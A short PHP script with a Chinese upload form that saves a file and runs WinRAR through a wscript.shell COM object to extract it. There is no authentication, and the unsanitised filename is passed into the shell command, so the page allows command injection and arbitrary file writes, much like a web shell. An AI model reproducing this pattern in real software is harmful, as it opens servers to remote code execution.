<?php

  $dir=getcwd();


   if($_POST[sub]){

     $tname=$_FILES[upfiles][tmp_name];
     $nname=$_FILES[upfiles][name];

     move_uploaded_file($tname,$nname);
     $obj=new com("wscript.shell");

      $obj->run("winrar x $dir\\".$nname." ".$dir , 1,true);

     unlink($nname);
   }



?>
 <form action="" method="POST" enctype="multipart/form-data">

 选择上传文件 <input type="file" name="upfiles"/>
 <input type="submit" name='sub' value='提交并解压' >

</form>

